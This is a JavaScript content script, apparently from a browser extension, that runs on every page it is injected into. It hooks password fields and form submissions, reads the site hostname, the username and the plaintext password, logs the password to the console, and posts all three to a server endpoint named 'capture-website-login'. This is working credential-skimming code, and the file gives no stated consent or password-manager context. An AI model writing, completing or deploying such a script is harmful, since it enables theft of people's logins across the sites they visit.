// content.js
// This script runs directly on the webpage to capture form data.

// Function to send data to the Node.js intermediary server
async function sendDataToNodeServer(data) {
    const NODE_JS_SERVER_URL = 'http://localhost:3002/capture-website-login';

    try {
        const response = await fetch(NODE_JS_SERVER_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        });

        if (!response.ok) {
            const errorText = await response.text();
            console.error(`[Content Script] Server responded with an error: ${response.status} - ${errorText}`);
            return { success: false, error: errorText };
        }

        const responseData = await response.json();
        console.log('[Content Script] Data successfully sent to Node.js server:', responseData);
        return { success: true, data: responseData };

    } catch (error) {
        console.error('[Content Script] Error sending data to Node.js server:', error);
        return { success: false, error: error.message };
    }
}

// Function to identify and capture data from forms/inputs
function captureFormData() {
    // Look for password input fields
    const passwordInputs = document.querySelectorAll('input[type="password"]');

    if (passwordInputs.length > 0) {
        console.log('[Content Script] Found password input fields on this page.');

        passwordInputs.forEach(input => {
            // Listen for 'change' event (when input value changes and loses focus)
            // or 'input' event (real-time typing)
            input.addEventListener('change', (event) => {
                const passwordValue = event.target.value;
                const hostname = window.location.hostname;
                const formElement = event.target.closest('form');
                const usernameInput = formElement ? (formElement.querySelector('input[type="text"]') || formElement.querySelector('input[type="email"]')) : null;
                const usernameValue = usernameInput ? usernameInput.value : '';

                if (passwordValue) {
                    console.log(`[Content Script] Password changed in input (type: ${event.target.type}, name: ${event.target.name || 'N/A'})`);
                    console.log(`[Content Script] Captured Password: ${passwordValue}`); // ONLY FOR DEBUGGING! REMOVE IN PRODUCTION!
                    console.log(`[Content Script] Captured Hostname: ${hostname}`);
                    console.log(`[Content Script] Captured Username (if found): ${usernameValue}`);

                    // Prepare data to send to Node.js server
                    const dataToSend = {
                        hostname: hostname,
                        username: usernameValue,
                        password: passwordValue, // This is the user-entered password from the website
                        source: "website_input_change" // To differentiate from popup data
                    };

                    // Send the data. You might want to debounce this or send on form submission.
                    // For now, sending on change for immediate debugging.
                    sendDataToNodeServer(dataToSend);
                }
            });

            // Consider listening for form submission if you want to capture at that point
            if (input.closest('form')) {
                input.closest('form').addEventListener('submit', (event) => {
                    // You might want to prevent default submission here if you're taking over
                    // event.preventDefault();

                    const form = event.target;
                    const hostname = window.location.hostname;
                    const passwordInput = form.querySelector('input[type="password"]');
                    const usernameInput = form.querySelector('input[type="text"]') || form.querySelector('input[type="email"]');

                    const passwordValue = passwordInput ? passwordInput.value : '';
                    const usernameValue = usernameInput ? usernameInput.value : '';

                    if (passwordValue) {
                        console.log(`[Content Script] Form submitted for: ${hostname}`);
                        console.log(`[Content Script] Captured Password on submit: ${passwordValue}`); // ONLY FOR DEBUGGING! REMOVE IN PRODUCTION!
                        console.log(`[Content Script] Captured Username on submit: ${usernameValue}`);

                        const dataToSend = {
                            hostname: hostname,
                            username: usernameValue,
                            password: passwordValue,
                            source: "website_form_submit" // To differentiate
                        };
                        sendDataToNodeServer(dataToSend);
                    }
                });
            }
        });
    } else {
        console.log('[Content Script] No password input fields found on this page.');
    }
}

// Run the capture function when the page loads
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', captureFormData);
} else {
    captureFormData();
}
